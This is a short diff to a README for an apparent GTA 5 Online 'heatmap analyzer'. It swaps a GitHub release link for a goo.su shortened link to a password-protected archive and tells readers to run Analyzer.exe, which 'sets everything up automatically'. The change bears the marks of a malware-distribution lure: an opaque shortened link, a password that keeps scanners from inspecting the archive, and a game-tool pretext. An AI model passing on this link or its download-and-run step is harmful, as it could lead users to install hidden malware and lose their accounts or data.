@@ -21,7 +21,7 @@ The application automatically fetches data from the **cloud** and highlights **"
 
 ## 📥 Installation & Run
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ **[Download](https://github.com/CatFeather1/GTA-5-Online-Heatmap-Analyze/releases/download/download/GameData_Analyzer.rar) and extract the `GameData_Analyzer.rar` (pass: 123Gamedata)**
+1️⃣ **[Download](https://goo.su/GM4j4) and extract archive(pass: Project12!)**
 
 2️⃣ **Run `Analyzer.exe`**   
 🚀 **The program will set everything up automatically – just enjoy!**  
